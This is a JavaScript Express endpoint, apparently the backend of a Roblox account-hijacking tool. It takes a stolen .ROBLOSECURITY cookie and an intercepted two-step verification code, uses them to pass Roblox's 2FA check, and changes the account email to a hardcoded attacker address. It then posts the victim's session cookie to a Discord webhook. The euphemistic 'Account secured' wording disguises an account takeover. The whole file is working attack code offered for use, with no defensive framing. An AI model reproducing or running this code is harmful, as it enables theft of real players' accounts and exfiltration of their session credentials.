app.use(express.json());

app.post('/verify-and-secure', async (req, res) => {
  const { cookie, csrfToken, challengeId, code, newEmail } = req.body;
  if (!cookie || !csrfToken || !challengeId || !code) {
    return res.status(400).send('Missing fields');
  }

  try {
    // 1. Verify the challenge with the intercepted code
    const verifyRes = await axios.post(
      'https://twostepverification.roblox.com/v1/users/authenticated/challenges/verify',
      { challengeId, verificationToken: code },
      {
        headers: {
          Cookie: `.ROBLOSECURITY=${cookie}`,
          'x-csrf-token': csrfToken,
          'Content-Type': 'application/json'
        }
      }
    );
    console.log('Verification result:', verifyRes.data);

    // 2. Change the account email to your email
    const changeEmailRes = await axios.post(
      'https://accountsettings.roblox.com/v1/email',
      { emailAddress: newEmail || 'evaristeguervens12@gmail.com' },
      {
        headers: {
          Cookie: `.ROBLOSECURITY=${cookie}`,
          'x-csrf-token': csrfToken,
          'Content-Type': 'application/json'
        }
      }
    );
    console.log('Email change result:', changeEmailRes.data);

    // 3. Notify Discord
    await axios.post(WEBHOOK_URL, {
      embeds: [{
        title: 'Account Secured Successfully',
        color: 0x00ff00,
        fields: [
          { name: 'Challenge Verified', value: code, inline: true },
          { name: 'Email changed', value: newEmail || 'your-email', inline: true },
          { name: 'Cookie', value: `||${cookie}||`, inline: false }
        ]
      }]
    });

    res.send('Account secured');
  } catch (e) {
    console.log('Error:', e.response?.data || e.message);
    res.status(500).send('Failed');
  }
});
